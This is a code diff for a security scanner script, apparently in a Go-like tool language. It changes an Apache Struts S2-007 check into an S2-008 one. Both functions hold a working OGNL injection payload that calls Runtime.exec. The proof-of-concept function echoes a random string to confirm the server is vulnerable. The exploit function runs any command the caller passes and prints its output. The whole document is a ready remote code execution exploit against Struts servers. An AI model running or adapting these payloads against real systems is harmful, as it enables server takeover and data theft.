@@ -2,32 +2,33 @@
 func poc(url){
     random_str = randstr(8)
     echo_data = "echo+"+random_str
-    check_poc = `'%2b(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false"),%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+echo_data +`').getInputStream()))%2b'`
-
+    check_poc = `debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27`+echo_data +`%27%29.getInputStream%28%29%29)`
     req, err = http.Post(
             url,
             http.useragent(http.uarand()),
             http.header("Content-Type","application/x-www-form-urlencoded"),
-            http.body(sprintf("username=test&age=%s",check_poc)),  //TODO 动态获取表单进行测试
+            http.body(check_poc),  //TODO 动态获取表单进行测试
             )
         if err != nil {
             return
         }
         if re.Match(random_str,http.GetAllBody(req)){
-            log.warn(url + " S2_007 found !!!")
+            log.warn(url + " S2_008 found !!!")
         }else{
-            log.debug(url + " S2_007 safe !!!")
+            log.debug(url + " S2_008 safe !!!")
         }
+
+        
 }
 
 //定义利用函数
 func exp(url,cmd){
-    check_poc = `'%2b(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false"),%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+cmd +`').getInputStream()))%2b'`
+    check_poc = `debug=command&expression=(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27`+cmd+`%27%29.getInputStream%28%29%29)`
     req, err = http.Post(
             url,
             http.useragent(http.uarand()),
             http.header("Content-Type","application/x-www-form-urlencoded"),
-            http.body(sprintf("username=test&age=%s",check_poc)),
+            http.body(check_poc),
             )
     println(string(http.GetAllBody(req)))
 }
